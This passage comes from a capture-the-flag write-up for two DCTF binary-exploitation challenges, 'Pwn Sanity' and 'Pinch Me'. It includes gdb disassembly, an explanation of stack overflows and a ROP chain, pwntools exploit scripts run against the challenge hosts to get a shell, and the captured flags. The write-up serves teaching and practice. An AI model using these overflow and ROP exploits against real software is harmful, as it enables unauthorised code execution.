</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000400697</span> <span class="err">&lt;+</span><span class="mi">0</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">push</span>   <span class="no">rbp</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000400698</span> <span class="err">&lt;+</span><span class="mi">1</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">rbp</span><span class="p">,</span><span class="no">rsp</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000040069b</span> <span class="err">&lt;+</span><span class="mi">4</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">sub</span>    <span class="no">rsp</span><span class="p">,</span><span class="mi">0x10</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000040069f</span> <span class="err">&lt;+</span><span class="mi">8</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-0x4</span><span class="p">],</span><span class="no">edi</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000004006a2</span> <span class="err">&lt;+</span><span class="mi">11</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-0x8</span><span class="p">],</span><span class="no">esi</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000004006a5</span> <span class="err">&lt;+</span><span class="mi">14</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">lea</span>    <span class="no">rdi</span><span class="p">,[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0x18c</span><span class="p">]</span>        <span class="c1"># 0x400838
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x00000000004006ac</span> <span class="err">&lt;+</span><span class="mi">21</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">call</span>   <span class="mh">0x400550</span> <span class="p">&lt;</span><span class="no">puts@plt</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000004006b1</span> <span class="err">&lt;+</span><span class="mi">26</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">cmp</span>    <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-0x4</span><span class="p">],</span><span class="mi">0xdeadbeef</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000004006b8</span> <span class="err">&lt;+</span><span class="mi">33</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">jne</span>    <span class="mh">0x4006f1</span> <span class="p">&lt;</span><span class="no">win</span><span class="p">+</span><span class="mi">90</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000004006ba</span> <span class="err">&lt;+</span><span class="mi">35</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">lea</span>    <span class="no">rdi</span><span class="p">,[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0x1b7</span><span class="p">]</span>        <span class="c1"># 0x400878
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x00000000004006c1</span> <span class="err">&lt;+</span><span class="mi">42</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">call</span>   <span class="mh">0x400550</span> <span class="p">&lt;</span><span class="no">puts@plt</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000004006c6</span> <span class="err">&lt;+</span><span class="mi">47</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">cmp</span>    <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-0x8</span><span class="p">],</span><span class="mi">0x1337c0de</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000004006cd</span> <span class="err">&lt;+</span><span class="mi">54</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">jne</span>    <span class="mh">0x4006f1</span> <span class="p">&lt;</span><span class="no">win</span><span class="p">+</span><span class="mi">90</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000004006cf</span> <span class="err">&lt;+</span><span class="mi">56</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">lea</span>    <span class="no">rdi</span><span class="p">,[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0x1b7</span><span class="p">]</span>        <span class="c1"># 0x40088d
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x00000000004006d6</span> <span class="err">&lt;+</span><span class="mi">63</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">call</span>   <span class="mh">0x400550</span> <span class="p">&lt;</span><span class="no">puts@plt</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000004006db</span> <span class="err">&lt;+</span><span class="mi">68</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">lea</span>    <span class="no">rdi</span><span class="p">,[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0x1bc</span><span class="p">]</span>        <span class="c1"># 0x40089e
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x00000000004006e2</span> <span class="err">&lt;+</span><span class="mi">75</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">call</span>   <span class="mh">0x400560</span> <span class="p">&lt;</span><span class="no">system@plt</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000004006e7</span> <span class="err">&lt;+</span><span class="mi">80</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">edi</span><span class="p">,</span><span class="mi">0x0</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000004006ec</span> <span class="err">&lt;+</span><span class="mi">85</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">call</span>   <span class="mh">0x4005a0</span> <span class="p">&lt;</span><span class="no">exit@plt</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000004006f1</span> <span class="err">&lt;+</span><span class="mi">90</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">nop</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000004006f2</span> <span class="err">&lt;+</span><span class="mi">91</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">leave</span>  
</span></span><span class="line"><span class="cl">   <span class="mi">0x00000000004006f3</span> <span class="err">&lt;+</span><span class="mi">92</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">ret</span>    
</span></span></code></pre></div><p>This function spawns a shell /bin/sh but only if the given argument to the function will be equivalent to 0xdeadbeef and 0x1337c0de respectively. In order to do so, we find the gadgets using ropper, since the binary is 64 bit, the calling convention of the 64 bit architecture says 1st argument for a function calls goes to the rdi while the second goes to rsi and so on. We find two useful gadgets here:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nl">x0000000000400813:</span> <span class="nf">pop</span> <span class="no">rdi</span><span class="c1">; ret; 
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">0</span><span class="nl">x0000000000400811:</span> <span class="nf">pop</span> <span class="no">rsi</span><span class="c1">; pop r15; ret; 
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="nf">Now</span><span class="p">,</span> <span class="no">we</span> <span class="no">can</span> <span class="no">just</span> <span class="no">create</span> <span class="no">a</span> <span class="no">ROP</span> <span class="no">chain</span> <span class="no">and</span> <span class="no">give</span> <span class="no">the</span> <span class="no">value</span> <span class="mi">0xdeadbeef</span> <span class="no">to</span> <span class="no">the</span> <span class="no">rdi</span> <span class="no">and</span> <span class="mi">0x1337c0de</span> <span class="no">to</span> <span class="no">the</span> <span class="no">rsi</span> <span class="no">and</span> <span class="no">give</span> <span class="no">any</span> <span class="no">junk</span> <span class="no">value</span> <span class="no">to</span> <span class="no">the</span> <span class="no">r15</span> <span class="no">since</span> <span class="no">it</span> <span class="no">doesn</span><span class="err">’</span><span class="no">t</span> <span class="no">matter</span> <span class="no">what</span> <span class="no">r15</span> <span class="no">holds</span><span class="p">,</span> <span class="no">the</span> <span class="no">exploit</span> <span class="no">was</span> <span class="no">as</span> <span class="no">follows</span><span class="p">:-</span>
</span></span><span class="line"><span class="cl"><span class="nf">py</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nf">from</span> <span class="no">pwn</span> <span class="no">import</span> <span class="p">*</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nf">p</span> <span class="err">=</span> <span class="no">remote</span><span class="p">(</span><span class="err">&#34;</span><span class="no">dctf-chall-pwn-sanity-check.westeurope.azurecontainer.io</span><span class="err">&#34;</span><span class="p">,</span> <span class="mi">7480</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nf">payload</span> <span class="err">=</span> <span class="no">b</span><span class="err">&#34;</span><span class="no">A</span><span class="err">&#34;</span><span class="p">*</span><span class="mi">72</span>
</span></span><span class="line"><span class="cl"><span class="nf">payload</span> <span class="err">+=</span> <span class="no">p64</span><span class="p">(</span><span class="mi">0x0000000000400813</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nf">payload</span> <span class="err">+=</span> <span class="no">p64</span><span class="p">(</span><span class="mi">0xdeadbeef</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nf">payload</span> <span class="err">+=</span> <span class="no">p64</span><span class="p">(</span><span class="mi">0x0000000000400811</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nf">payload</span> <span class="err">+=</span> <span class="no">p64</span><span class="p">(</span><span class="mi">0x1337c0de</span><span class="p">)*</span><span class="mi">2</span>
</span></span><span class="line"><span class="cl"><span class="nf">payload</span> <span class="err">+=</span> <span class="no">p64</span><span class="p">(</span><span class="mi">0x400697</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nf">p.recvline</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="nf">p.sendline</span><span class="p">(</span><span class="no">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nf">p.interactive</span><span class="p">()</span>
</span></span></code></pre></div><p>Running the exploit:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="err">❯</span> <span class="nf">python3</span> <span class="no">pwn_sanity.py</span>
</span></span><span class="line"><span class="cl"><span class="err">[+]</span> <span class="nf">Opening</span> <span class="no">connection</span> <span class="no">to</span> <span class="no">dctf-chall-pwn-sanity-check.westeurope.azurecontainer.io</span> <span class="no">on</span> <span class="no">port</span> <span class="mi">7480</span><span class="p">:</span> <span class="no">Done</span>
</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nf">Switching</span> <span class="no">to</span> <span class="no">interactive</span> <span class="no">mode</span>
</span></span><span class="line"><span class="cl"><span class="nf">will</span> <span class="no">this</span> <span class="no">work</span><span class="err">?</span>
</span></span><span class="line"><span class="cl"><span class="nf">you</span> <span class="no">made</span> <span class="no">it</span> <span class="no">to</span> <span class="no">win</span> <span class="no">land</span><span class="p">,</span> <span class="no">no</span> <span class="no">free</span> <span class="no">handouts</span> <span class="no">this</span> <span class="no">time</span><span class="p">,</span> <span class="no">try</span> <span class="no">harder</span>
</span></span><span class="line"><span class="cl"><span class="nf">one</span> <span class="no">down</span><span class="p">,</span> <span class="no">one</span> <span class="no">to</span> <span class="no">go</span><span class="p">!</span>
</span></span><span class="line"><span class="cl"><span class="err">2/2</span> <span class="nf">bro</span> <span class="no">good</span> <span class="no">job</span>
</span></span><span class="line"><span class="cl"><span class="nf">$</span> <span class="no">cat</span> <span class="no">flag.txt</span>
</span></span><span class="line"><span class="cl"><span class="nf">dctf</span><span class="err">{</span><span class="no">Ju5t_m0v3_0n</span><span class="err">}</span>
</span></span><span class="line"><span class="cl"><span class="nf">$</span> 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="no">Pinch</span> <span class="no">Me</span>
</span></span></code></pre></div><p>This challenge was also simple, loading the binary in gdb and checking the functions it contains, we can see that there’s a main function and vuln functions which are of interest:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  <span class="no">disas</span> <span class="no">main</span>
</span></span><span class="line"><span class="cl"><span class="nf">Dump</span> <span class="no">of</span> <span class="no">assembler</span> <span class="no">code</span> <span class="no">for</span> <span class="no">function</span> <span class="no">main</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000004011d5</span> <span class="err">&lt;+</span><span class="mi">0</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">push</span>   <span class="no">rbp</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000004011d6</span> <span class="err">&lt;+</span><span class="mi">1</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">rbp</span><span class="p">,</span><span class="no">rsp</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000004011d9</span> <span class="err">&lt;+</span><span class="mi">4</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">edi</span><span class="p">,</span><span class="mi">0xa</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000004011de</span> <span class="err">&lt;+</span><span class="mi">9</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">call</span>   <span class="mh">0x401050</span> <span class="p">&lt;</span><span class="no">alarm@plt</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000004011e3</span> <span class="err">&lt;+</span><span class="mi">14</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">eax</span><span class="p">,</span><span class="mi">0x0</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000004011e8</span> <span class="err">&lt;+</span><span class="mi">19</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">call</span>   <span class="mh">0x401152</span> <span class="p">&lt;</span><span class="no">vuln</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000004011ed</span> <span class="err">&lt;+</span><span class="mi">24</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">eax</span><span class="p">,</span><span class="mi">0x0</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000004011f2</span> <span class="err">&lt;+</span><span class="mi">29</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">pop</span>    <span class="no">rbp</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000004011f3</span> <span class="err">&lt;+</span><span class="mi">30</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">ret</span>    
</span></span><span class="line"><span class="cl"><span class="no">End</span> <span class="no">of</span> <span class="no">assembler</span> <span class="no">dump.</span>
</span></span><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  <span class="no">disas</span> <span class="no">vuln</span> 
</span></span><span class="line"><span class="cl"><span class="no">Dump</span> <span class="no">of</span> <span class="no">assembler</span> <span class="no">code</span> <span class="no">for</span> <span class="no">function</span> <span class="no">vuln</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000401152</span> <span class="err">&lt;+</span><span class="mi">0</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">push</span>   <span class="no">rbp</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000401153</span> <span class="err">&lt;+</span><span class="mi">1</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">rbp</span><span class="p">,</span><span class="no">rsp</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000401156</span> <span class="err">&lt;+</span><span class="mi">4</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">sub</span>    <span class="no">rsp</span><span class="p">,</span><span class="mi">0x20</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000040115a</span> <span class="err">&lt;+</span><span class="mi">8</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-0x4</span><span class="p">],</span><span class="mi">0x1234567</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000401161</span> <span class="err">&lt;+</span><span class="mi">15</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-0x8</span><span class="p">],</span><span class="mi">0x89abcdef</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000401168</span> <span class="err">&lt;+</span><span class="mi">22</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">lea</span>    <span class="no">rdi</span><span class="p">,[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0xe99</span><span class="p">]</span>        <span class="c1"># 0x402008
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x000000000040116f</span> <span class="err">&lt;+</span><span class="mi">29</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">call</span>   <span class="mh">0x401030</span> <span class="p">&lt;</span><span class="no">puts@plt</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000401174</span> <span class="err">&lt;+</span><span class="mi">34</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">lea</span>    <span class="no">rdi</span><span class="p">,[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0xebd</span><span class="p">]</span>        <span class="c1"># 0x402038
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x000000000040117b</span> <span class="err">&lt;+</span><span class="mi">41</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">call</span>   <span class="mh">0x401030</span> <span class="p">&lt;</span><span class="no">puts@plt</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000401180</span> <span class="err">&lt;+</span><span class="mi">46</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">rdx</span><span class="p">,</span><span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0x2ec9</span><span class="p">]</span>        <span class="c1"># 0x404050 &lt;stdin@@GLIBC_2.2.5&gt;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x0000000000401187</span> <span class="err">&lt;+</span><span class="mi">53</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">lea</span>    <span class="no">rax</span><span class="p">,[</span><span class="no">rbp-0x20</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000040118b</span> <span class="err">&lt;+</span><span class="mi">57</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">esi</span><span class="p">,</span><span class="mi">0x64</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000401190</span> <span class="err">&lt;+</span><span class="mi">62</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">rdi</span><span class="p">,</span><span class="no">rax</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000401193</span> <span class="err">&lt;+</span><span class="mi">65</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">call</span>   <span class="mh">0x401060</span> <span class="p">&lt;</span><span class="no">fgets@plt</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000401198</span> <span class="err">&lt;+</span><span class="mi">70</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">cmp</span>    <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-0x8</span><span class="p">],</span><span class="mi">0x1337c0de</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000040119f</span> <span class="err">&lt;+</span><span class="mi">77</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">jne</span>    <span class="mh">0x4011af</span> <span class="p">&lt;</span><span class="no">vuln</span><span class="p">+</span><span class="mi">93</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000004011a1</span> <span class="err">&lt;+</span><span class="mi">79</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">lea</span>    <span class="no">rdi</span><span class="p">,[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0xe9f</span><span class="p">]</span>        <span class="c1"># 0x402047
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x00000000004011a8</span> <span class="err">&lt;+</span><span class="mi">86</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">call</span>   <span class="mh">0x401040</span> <span class="p">&lt;</span><span class="no">system@plt</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000004011ad</span> <span class="err">&lt;+</span><span class="mi">91</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">jmp</span>    <span class="mh">0x4011d2</span> <span class="p">&lt;</span><span class="no">vuln</span><span class="p">+</span><span class="mi">128</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000004011af</span> <span class="err">&lt;+</span><span class="mi">93</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">cmp</span>    <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-0x4</span><span class="p">],</span><span class="mi">0x1234567</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000004011b6</span> <span class="err">&lt;+</span><span class="mi">100</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">je</span>     <span class="mh">0x4011c6</span> <span class="p">&lt;</span><span class="no">vuln</span><span class="p">+</span><span class="mi">116</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000004011b8</span> <span class="err">&lt;+</span><span class="mi">102</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">lea</span>    <span class="no">rdi</span><span class="p">,[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0xe90</span><span class="p">]</span>        <span class="c1"># 0x40204f
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x00000000004011bf</span> <span class="err">&lt;+</span><span class="mi">109</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">call</span>   <span class="mh">0x401030</span> <span class="p">&lt;</span><span class="no">puts@plt</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000004011c4</span> <span class="err">&lt;+</span><span class="mi">114</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">jmp</span>    <span class="mh">0x4011d2</span> <span class="p">&lt;</span><span class="no">vuln</span><span class="p">+</span><span class="mi">128</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000004011c6</span> <span class="err">&lt;+</span><span class="mi">116</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">lea</span>    <span class="no">rdi</span><span class="p">,[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0xe93</span><span class="p">]</span>        <span class="c1"># 0x402060
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x00000000004011cd</span> <span class="err">&lt;+</span><span class="mi">123</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">call</span>   <span class="mh">0x401030</span> <span class="p">&lt;</span><span class="no">puts@plt</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000004011d2</span> <span class="err">&lt;+</span><span class="mi">128</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">nop</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000004011d3</span> <span class="err">&lt;+</span><span class="mi">129</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">leave</span>  
</span></span><span class="line"><span class="cl">   <span class="mi">0x00000000004011d4</span> <span class="err">&lt;+</span><span class="mi">130</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">ret</span>    
</span></span><span class="line"><span class="cl"><span class="no">End</span> <span class="no">of</span> <span class="no">assembler</span> <span class="no">dump.</span>
</span></span><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  
</span></span></code></pre></div><p>The vuln function has an obvious buffer overflow as same as of the Pwn Sanity only the size changed yet the vulnerability remains the same, the function checks whether the variable stored at the <code>rbp - 0x8</code> is equal to the <code>0x1337c0de</code> and if it does calls <code>system(&quot;/bin/sh&quot;)</code>, so in order to do, we know that the buffer we control the input for is stored at <code>rbp - 0x20</code> and the <code>rbp - 0x8</code> was compared to the value of <code>0x1337c0de</code>, so we can just do 0x20 - 0x8 to get the offset for the variable we need to control the input for which would be <code>0x20 - 0x8 = 24</code>, hence <code>24</code> is the offset for the comparing value, then we can just grab the flag from the server:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;dctf1-chall-pinch-me.westeurope.azurecontainer.io&#34;</span><span class="p">,</span> <span class="mi">7480</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="mi">24</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x1337c0de</span><span class="p">)</span> <span class="c1"># integer is 4 bytes, hence p32()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">Run</span> <span class="n">the</span> <span class="n">exploit</span><span class="p">:</span><span class="o">-</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="err">❯</span> <span class="n">python3</span> <span class="n">pinch_me</span><span class="o">.</span><span class="n">py</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Opening</span> <span class="n">connection</span> <span class="n">to</span> <span class="n">dctf1</span><span class="o">-</span><span class="n">chall</span><span class="o">-</span><span class="n">pinch</span><span class="o">-</span><span class="n">me</span><span class="o">.</span><span class="n">westeurope</span><span class="o">.</span><span class="n">azurecontainer</span><span class="o">.</span><span class="n">io</span> <span class="n">on</span> <span class="n">port</span> <span class="mi">7480</span><span class="p">:</span> <span class="n">Done</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Switching</span> <span class="n">to</span> <span class="n">interactive</span> <span class="n">mode</span>
</span></span><span class="line"><span class="cl"><span class="n">Am</span> <span class="n">I</span> <span class="n">dreaming</span><span class="err">?</span>
</span></span><span class="line"><span class="cl"><span class="err">$</span> <span class="nb">id</span>
</span></span><span class="line"><span class="cl"><span class="n">uid</span><span class="o">=</span><span class="mi">1000</span><span class="p">(</span><span class="n">pilot</span><span class="p">)</span> <span class="n">gid</span><span class="o">=</span><span class="mi">1000</span><span class="p">(</span><span class="n">pilot</span><span class="p">)</span> <span class="n">groups</span><span class="o">=</span><span class="mi">1000</span><span class="p">(</span><span class="n">pilot</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="err">$</span> <span class="n">cat</span> <span class="n">flag</span><span class="o">.</span><span class="n">txt</span>
</span></span><span class="line"><span class="cl"><span class="n">dctf</span><span class="p">{</span><span class="n">y0u_kn0w_wh4t_15_h4pp3n1ng_b75</span><span class="err">?</span><span class="p">}</span><span class="err">$</span> 
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Interrupted</span>
